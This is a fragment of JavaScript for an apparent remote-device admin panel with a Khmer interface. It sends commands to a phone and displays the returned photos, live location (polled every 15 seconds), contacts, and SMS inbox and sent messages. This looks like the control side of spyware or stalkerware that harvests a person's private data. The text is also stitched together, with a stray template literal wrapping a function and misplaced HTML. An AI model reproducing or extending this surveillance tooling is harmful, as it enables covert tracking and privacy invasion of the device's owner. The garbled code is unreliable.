        if (Array.isArray(newHistory)) locationHistory = newHistory;
        const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);
        if (locationCmd?.result_data) commandData.location = locationCmd.result_data;
        renderLocation();
      } catch (err) {
        console.error('Live tracking refresh error:', err);
      }
    }, 15000);
  }
}

  return `

async function loadMorePhotos() {
  if (isLoadingMore) return;
  isLoadingMore = true;
  
  const btn = document.getElementById('loadMoreBtn');
  if (btn) {
    btn.disabled = true;
    btn.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> កំពុងទាញយក...';
    btn.style.opacity = '0.6';
  }
  
  try {
    // Send command to fetch next page
    await api('/device/command', {
      method: 'POST',
      body: {
        user_id: parseInt(userId),
        command_type: 'get_photos',
        payload: { limit: photosPerPage, offset: photosOffset }
      }
    });
    
    // Poll for result (max 60 seconds)
    let newPhotos = [];
    for (let i = 0; i < 30; i++) {
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const commands = await api(`/device/commands?user_id=${userId}&limit=10`);
      const latestCmd = commands.find(c => 
        c.command_type === 'get_photos' && 
        c.result_data &&
        c.result_data.offset === photosOffset
      );
      
      if (latestCmd) {
        newPhotos = latestCmd.result_data.photos || [];
        break;
      }
    }
    
    if (newPhotos.length > 0) {
      // Add new photos to accumulated list (deduplicate by id)
      const seenIds = new Set(allPhotos.map(p => p.id));
      for (const p of newPhotos) {
        if (!seenIds.has(p.id)) {
          allPhotos.push(p);
        }
      }
      photosOffset = allPhotos.length;
      commandData.photos = { photos: allPhotos, count: allPhotos.length };
      
      // Re-render photos grid
      renderPhotos();
      
      // Scroll to bottom to show new photos
      setTimeout(() => {
        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
      }, 100);
    } else {
      alert('មិនមានរូបភាពបន្ថែមទេ');
    }
  } catch (error) {
    console.error('Load more error:', error);
    alert('❌ មិនអាចផ្ទុករូបភាពបន្ថែម: ' + error.message);
  } finally {
    isLoadingMore = false;
  }
}

      </div>

      <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; text-align: left; margin-top: 20px;">
        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
          <small style="color: #666;">កាលបរិច្ឆេទ</small><br>
          <strong>${dt(photo.date)}</strong>
        </div>
        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
          <small style="color: #666;">ទំហំ file</small><br>
          <strong>${(photo.size / 1024).toFixed(2)} KB</strong>
        </div>
        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
          <small style="color: #666;">ទំហំរូបភាព</small><br>
          <strong>${photo.width} x ${photo.height}</strong>
        </div>
        <div style="padding: 12px; background: #f5f7fa; border-radius: 8px;">
          <small style="color: #666;">ប្រភេទ</small><br>
          <strong>${esc(photo.mimeType)}</strong>
        </div>
      </div>
      <div style="margin-top: 20px; display: flex; gap: 12px; justify-content: center;">
        <button onclick="downloadSinglePhoto(${photo.id})" style="padding: 10px 24px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; font-family: inherit; font-size: 14px;">
          ⬇️ Download
        </button>
      </div>
      <div style="margin-top: 12px; font-size: 12px; color: #999;">
        រូបភាព ${currentIndex + 1} នៃ ${photos.length}
      </div>
    </div>
  `;
  
  showModal('🖼️ ព័ត៌មានរូបភាព', html);
}

function downloadSinglePhoto(photoId) {
  const photos = allPhotos.length > 0 ? allPhotos : (commandData.photos?.photos || []);
  const photo = photos.find(p => p.id === photoId);
  if (!photo || !photo.thumbnail) {
    alert('មិនមានរូបភាពសម្រាប់ download');
    return;
  }
  
  const link = document.createElement('a');
  link.href = `data:image/jpeg;base64,${photo.thumbnail}`;
  link.download = photo.name || `photo_${photo.id}.jpg`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function toggleMapView() {
  if (!map || !standardLayer || !satelliteLayer) return;
  
  const toggleBtn = document.getElementById('mapToggle');
  const toggleIcon = document.getElementById('toggleIcon');
  const toggleText = document.getElementById('toggleText');
  
  if (isSatelliteView) {
    // Switch to standard view
    map.removeLayer(satelliteLayer);
    standardLayer.addTo(map);
    isSatelliteView = false;
    toggleIcon.textContent = '🛰️';
    toggleText.textContent = 'Satellite';
    toggleBtn.classList.remove('active');
  } else {
    // Switch to satellite view
    map.removeLayer(standardLayer);
    satelliteLayer.addTo(map);
    isSatelliteView = true;
    toggleIcon.textContent = '🗺️';
    toggleText.textContent = 'Map';
    toggleBtn.classList.add('active');
  }
}

async function refreshLocation() {
  const btn = document.getElementById('refreshLocation');
  const originalHTML = btn.innerHTML;

  btn.innerHTML = '<span style="animation: spin 1s linear infinite">⏳</span> <span>កំពុងផ្ទុក...</span>';
  btn.disabled = true;
  btn.style.opacity = '0.6';

  try {
    const [newHistory, commands] = await Promise.all([
      api(`/device/locations?user_id=${userId}&limit=100`).catch(() => []),
      api(`/device/commands?user_id=${userId}&limit=10`),
    ]);

    if (Array.isArray(newHistory)) locationHistory = newHistory;
    const locationCmd = commands.find(c => c.command_type === 'get_location' && c.result_data);
    if (locationCmd?.result_data) commandData.location = locationCmd.result_data;

    if (map) {
      map.remove();
      map = null;
    }
    renderLocation();

    btn.innerHTML = '<span>✅</span> <span>ជោគជ័យ!</span>';
    setTimeout(() => {
      btn.innerHTML = originalHTML;
      btn.disabled = false;
      btn.style.opacity = '1';
    }, 1500);
  } catch (error) {
    console.error('Refresh error:', error);
    btn.innerHTML = '<span>❌</span> <span>បរាជ័យ</span>';
    setTimeout(() => {
      btn.innerHTML = originalHTML;
      btn.disabled = false;
      btn.style.opacity = '1';
    }, 2000);
  }
}

function openInGoogleMaps() {
  let lat, lng;

  if (locationHistory.length > 0) {
    const sorted = [...locationHistory].sort((a, b) => new Date(b.recorded_at) - new Date(a.recorded_at));
    lat = parseFloat(sorted[0].lat);
    lng = parseFloat(sorted[0].lng);
  } else if (commandData.location?.lat && commandData.location?.lng) {
    lat = parseFloat(commandData.location.lat);
    lng = parseFloat(commandData.location.lng);
  }

  if (!lat || !lng || isNaN(lat) || isNaN(lng)) {
    alert('❌ មិនមានទិន្នន័យទីតាំង\nសូមចុច 🔄 ផ្ទុកឡើងវិញ ឬ 📍 Location ក្នុង admin panel');
    return;
  }

  const isAndroid = /Android/i.test(navigator.userAgent);
  const latStr = lat.toFixed(6);
  const lngStr = lng.toFixed(6);

  let url;
  if (isAndroid) {
    url = `geo:${latStr},${lngStr}?z=18`;
  } else {
    url = `https://www.google.com/maps?q=${latStr},${lngStr}&z=18`;
  }

  window.open(url, '_blank');
}

function renderContacts(filter = '') {
  const data = commandData.contacts;
  if (!data || !data.contacts) {
    document.getElementById('contactStats').innerHTML = '';
    document.getElementById('contactsContent').innerHTML = `
      <div class="empty">
        <div class="empty-icon">👥</div>
        <div class="empty-text">មិនមាន contacts ទេ<br>សូមចុច 👥 Contacts ក្នុង admin panel ដើម្បីទាញយក</div>
      </div>
    `;
    return;
  }
  
  let contacts = data.contacts;
  if (filter) {
    const f = filter.toLowerCase();
    contacts = contacts.filter(c => 
      (c.displayName || '').toLowerCase().includes(f) ||
      (c.phones || []).some(p => p.toLowerCase().includes(f)) ||
      (c.emails || []).some(e => (e || '').toLowerCase().includes(f))
    );
  }
  
  document.getElementById('contactStats').innerHTML = `
    <div class="stat-card">
      <div class="stat-value">${contacts.length}</div>
      <div class="stat-label">📱 ទាំងអស់</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${contacts.filter(c => c.phones && c.phones.length > 0).length}</div>
      <div class="stat-label">📞 មានលេខ</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${contacts.filter(c => c.emails && c.emails.length > 0).length}</div>
      <div class="stat-label">📧 មាន Email</div>
    </div>
  `;
  
  if (contacts.length === 0) {
    document.getElementById('contactsContent').innerHTML = `
      <div class="empty">
        <div class="empty-icon">🔍</div>
        <div class="empty-text">រកមិនឃើញ contact ដែលត្រូវនឹងការស្វែងរក</div>
      </div>
    `;
    return;
  }
  
  document.getElementById('contactsContent').innerHTML = `
    <table class="data-table">
      <thead>
        <tr>
          <th>👤 ឈ្មោះ</th>
          <th>📞 ទូរស័ព្ទ</th>
          <th>📧 Email</th>
        </tr>
      </thead>
      <tbody>
        ${contacts.map(c => `
          <tr>
            <td><strong>${esc(c.displayName || '—')}</strong></td>
            <td style="font-family:monospace;color:#667eea;font-weight:600">${esc((c.phones || []).join(', ') || '—')}</td>
            <td style="color:#666">${esc((c.emails || []).join(', ') || '—')}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderSMS(filter = '') {
  const data = commandData.sms;
  if (!data || !data.messages) {
    document.getElementById('smsStats').innerHTML = '';
    document.getElementById('smsContent').innerHTML = `
      <div class="empty">
        <div class="empty-icon">💬</div>
        <div class="empty-text">មិនមាន SMS ទេ<br>សូមចុច 📨 Read SMS ក្នុង admin panel ដើម្បីទាញយក</div>
      </div>
    `;
    return;
  }
  
  let messages = data.messages;
  if (filter) {
    const f = filter.toLowerCase();
    messages = messages.filter(m => 
      (m.address || '').toLowerCase().includes(f) ||
      (m.body || '').toLowerCase().includes(f)
    );
  }
  
  document.getElementById('smsStats').innerHTML = `
    <div class="stat-card">
      <div class="stat-value">${messages.length}</div>
      <div class="stat-label">💬 ទាំងអស់</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${messages.filter(m => m.type === 'inbox').length}</div>
      <div class="stat-label">📥 Inbox</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${messages.filter(m => m.type === 'sent').length}</div>
      <div class="stat-label">📤 Sent</div>
    </div>
    <div class="stat-card">
      <div class="stat-value">${messages.filter(m => !m.read).length}</div>
      <div class="stat-label">🔴 មិនទាន់អាន</div>
    </div>
  `;
  
  if (messages.length === 0) {
    document.getElementById('smsContent').innerHTML = `
      <div class="empty">
        <div class="empty-icon">🔍</div>
        <div class="empty-text">រកមិនឃើញ SMS ដែលត្រូវនឹងការស្វែងរក</div>
      </div>
    `;
    return;
  }
  
  document.getElementById('smsContent').innerHTML = `
    <div class="sms-list">
      ${messages.map(m => `
        <div class="sms-card">
          <div class="sms-header">
            <strong>📱 ${esc(m.address || 'Unknown')}</strong>
            <small>🕐 ${dt(m.date)}</small>
          </div>
          <div class="sms-meta">
            <span class="pill ${m.type || 'unknown'}">${m.type === 'inbox' ? '📥' : m.type === 'sent' ? '📤' : '📨'} ${esc(m.type || 'unknown')}</span>
            ${m.read ? '<span class="pill read">✓ អាន</span>' : '<span class="pill unread">● ថ្មី</span>'}
          </div>
          <div class="sms-body">${esc(m.body || '')}</div>
        </div>
      `).join('')}
    </div>
  `;
}

// Search handlers
document.getElementById('contactSearch').oninput = (e) => renderContacts(e.target.value);
document.getElementById('smsSearch').oninput = (e) => renderSMS(e.target.value);

// Cleanup live tracking on page close
window.addEventListener('beforeunload', () => {
  if (liveTrackingInterval) {
    clearInterval(liveTrackingInterval);
  }
});

// Load data on page load
loadData();
</script>
